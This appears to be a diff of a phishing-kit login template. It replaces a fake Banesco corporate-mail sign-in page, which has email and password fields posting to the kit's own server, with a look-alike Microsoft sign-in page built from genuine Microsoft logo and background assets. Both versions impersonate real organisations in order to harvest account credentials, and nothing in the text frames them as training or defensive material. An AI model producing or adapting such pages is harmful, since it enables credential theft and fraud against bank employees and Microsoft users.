@@ -1,52 +1,212 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>https://banesco-sso.appspot.com/Index.jsp?domain=banescoseguros.com&SAMLRequest=fVLLTuswEN1fiX%2BwvM%2BjAcSV1QQVEKISj4gGFuwcZ5K4dTzB47Tw9zdNQXAXsD0%2Bcx7jmZ%2B%2FdYZtwZFGm%2FJZGHMGVmGlbZPyp%2BI6%2BMvPs6M%2Fc5Kd6cVi8K19hNcByLNx0pKYHlI%2BOCtQkiZhZQckvBKrxd2tSMJY9A49KjScLa9SvtZtqzdl22%2BMKdcVtqqvurarsIFmrWwNZd8063rD2fNnrGQfa0k0wNKSl9aPUJycBPFZkJwWs2MRJyJJXjjLP5wutD00%2BC1WeSCRuCmKPMgfVsUksNUVuPuRnfIGsTEQKuz29rkk0tsRrqUh4GxBBM6PAS%2FR0tCBW4HbagVPj7cpb73vSUTRbrcLv2QiGZXSAikkaAaHdAAV8WzasJhKum%2Br%2Fb2C%2FIzAsy%2BTefRNKvv4uX2h5VWORqt3tjAGd5cOpB%2FbeDeMZa7RddL%2F7DYLZxOiq6CeqGKw1IPStYaKsyg7uP5%2FIuPh%2FAM%3D&RelayState=https%3A%2F%2Fwww.google.com%2Fa%2Fbanescoseguros.com%2FServiceLogin%3Fservice%3Dmail%26passive%3Dtrue%26rm%3Dfalse%26continue%3Dhttps%253A%252F%252Fmail.google.com%252Fmail%252F%26ss%3D1%26ltmpl%3Ddefault%26ltmplcache%3D2%26emr%3D1%26osid%3D1</title>
-    <link rel="shortcut icon" href="{{ url_for('static', filename='favicon.ico') }}" type="image/x-icon">
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
-</head>
-<body>
-    <div id="wrapper">
-        <div id="logos">
-            <p style="color: #333333"><b>Bienvenido al correo corporativo de Banesco</b></p>
-            <img src="https://esc-files.appspot.com/files/mimefile/BanescoNuevo/pantalla-login-logos.png" alt="Banesco Logo">
-        </div>
-        <span class="ping">
-            <img src="https://esc-files.appspot.com/files/mimefile/BanescoNuevo/pantalla-login-ping.png" alt="Ping">
-        </span>
-        <span class="logo-banesco">
-            <img src="https://esc-files.appspot.com/files/mimefile/BanescoNuevo/pantalla-login-logo2.png" alt="Banesco Logo">
-        </span>
-        <div id="form-login">
-            <span class="error">
-                {% if error_message %}
-                <ul>
-                    <li>{{ error_message }}</li>
-                </ul>
-                {% else %}
-                <ul></ul>
-                {% endif %}
-            </span>
-            <form name="authForm" action="/" method="post" autocomplete="off">
-                <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
-                {% if user_id %}
-                    <input type="hidden" name="user_id" value="{{ user_id }}"/>
-                {% endif %}
-                <span>Correo electrónico:</span>
-                <input type="email" name="account" size="50" placeholder="Correo electrónico corporativo" required>
-                <span>Contraseña:</span>
-                <input type="password" name="password" size="50" placeholder="Contraseña" required>
-                <input class="button-iniciar" type="submit" value="Iniciar Sesión">
-                <input class="button-cancelar" type="button" value="Cancelar" onclick="javascript:close_window()">
-            </form>
-            <p class="atencion">En caso de dudas, contacta a <b>Service Desk</b></p>
-        </div>
-        <div id="shadow"></div>
-        <div id="banderas">
-            <img src="https://esc-files.appspot.com/files/mimefile/BanescoNuevo/pantalla-login-banderas.png" alt="Banderas">
-        </div>
+  <head>
+    <link rel="shortcut icon" href="{{ url_for('static', filename='favicon.ico') }}" type="image/x-icon" />
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              "ms-eerie-black": "#1b1b1b",
+            },
+          },
+        },
+      };
+    </script>
+  </head>
+  <body class="min-h-screen">
+    <div class="absolute top-0 left-0 w-full h-full bg-[#f2f2f2] contain-content">
+      <img
+        style="animation: fadeIn 1s"
+        class="object-cover"
+        aria-hidden="true"
+        src="https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg"
+        alt="Image Background"
+      />
     </div>
+
+    <main class="absolute w-full h-full flex flex-col items-center justify-center">
+      <section id="lightbox" class="mx-auto">
+        <div>
+          <img
+            class="logo"
+            role="img"
+            src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
+            alt="Microsoft"
+          />
+        </div>
+        <div class="relative mt-4 mb-3 show-from-r min-h-[206px]">
+          <h1 class="text-ms-eerie-black segoe-ui text-2xl leading-7 font-semibold text-left">Iniciar sesión</h1>
+
+          <div>
+            <input
+              placeholder="Correo electrónico, teléfono o Skype"
+              aria-required="true"
+              maxlength="113"
+              autocomplete="username"
+              type="email"
+              class="input text-ms-eerie-black"
+            />
+          </div>
+        </div>
+      </section>
+
+      <section id="credbox" class="mx-auto">
+        <div class="w-full h-full cursor-pointer flex items-center gap-3 py-2 px-11">
+          <img
+            width="32"
+            height="32"
+            role="presentation"
+            src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
+          />
+          <span class="text-[15px] leading-4 text-ms-eerie-black">Opciones de inicio de sesión</span>
+        </div>
+      </section>
+    </main>
+
+    <footer class="absolute left-0 bottom-0 overflow-visible z-30 clear-both w-full min-h-7">
+      <div class="flex w-full h-full gap-4 items-center justify-end pr-3">
+        <a
+          class="text-ms-eerie-black text-[12px] leading-7 text-nowrap"
+          href="https://www.microsoft.com/es-ES/servicesagreement"
+          >Términos de uso</a
+        >
+        <a
+          class="text-ms-eerie-black text-[12px] leading-7 text-nowrap"
+          href="https://privacy.microsoft.com/es-ES/privacystatement"
+          >Privacidad y cookies</a
+        >
+        <a
+          class="text-debug"
+          href="#"
+          role="button"
+          aria-label="Haga clic aquí para obtener información relacionada con la solución de problemas."
+          aria-expanded="false"
+          >...</a
+        >
+      </div>
+    </footer>
     <script src="{{ url_for('static', filename='script.js') }}"></script>
-</body>
+    <style>
+      body {
+        font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima",
+          "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI",
+          "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic",
+          "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le",
+          "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        font-size: 15px;
+        line-height: 20px;
+        font-weight: 400;
+        font-size: 0.9375rem;
+        line-height: 1.25rem;
+        padding-bottom: 0.227px;
+        padding-top: 0.227px;
+        color: #000;
+      }
+
+      #lightbox {
+        position: relative;
+        max-width: 440px;
+        width: calc(100% - 40px);
+        padding: 44px;
+        margin-bottom: 28px;
+        background-color: #fff;
+        -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        min-width: 320px;
+        min-height: 338px;
+        overflow: hidden;
+      }
+
+      #credbox {
+        position: relative;
+        max-width: 440px;
+        width: calc(100% - 40px);
+        padding: 44px;
+        margin-bottom: 28px;
+        line-height: 16px;
+        min-width: 320px;
+        overflow: hidden;
+        padding: 0;
+        background-color: #fff;
+        -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+      }
+
+      .segoe-ui {
+        font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi,
+          "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha,
+          Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa",
+          "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti",
+          "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+      }
+
+      .text-debug {
+        cursor: pointer;
+        transform: translate(12%, -10%);
+        font-size: 13px;
+        font-weight: 600;
+        height: 22px;
+        letter-spacing: 3px;
+        line-height: 22px;
+        outline-color: rgb(0, 0, 0);
+        outline-style: none;
+        outline-width: 0px;
+        text-align: left;
+        text-decoration: none;
+        text-wrap: nowrap;
+        vertical-align: top;
+        white-space-collapse: collapse;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+
+        to {
+          opacity: 1;
+        }
+      }
+
+      .show-from-r {
+        -webkit-animation-name: show-from-right;
+        -webkit-animation-duration: 0.25s;
+        -webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
+        -webkit-animation-fill-mode: both;
+        -webkit-transition-property: left;
+      }
+
+      @keyframes show-from-right {
+        from {
+          left: 200px;
+          opacity: 0;
+        }
+
+        to {
+          left: 0;
+          opacity: 1;
+        }
+      }
+
+      .input {
+        width: 100%;
+        border-style: solid;
+        padding: 6px 10px;
+        border-width: 1px;
+        border-color: rgba(0, 0, 0, 0.6);
+        height: 36px;
+        outline: none;
+        background-color: transparent;
+        border-top-width: 0;
+        border-left-width: 0;
+        border-right-width: 0;
+        padding-left: 0;
+      }
+    </style>
+  </body>
 </html>
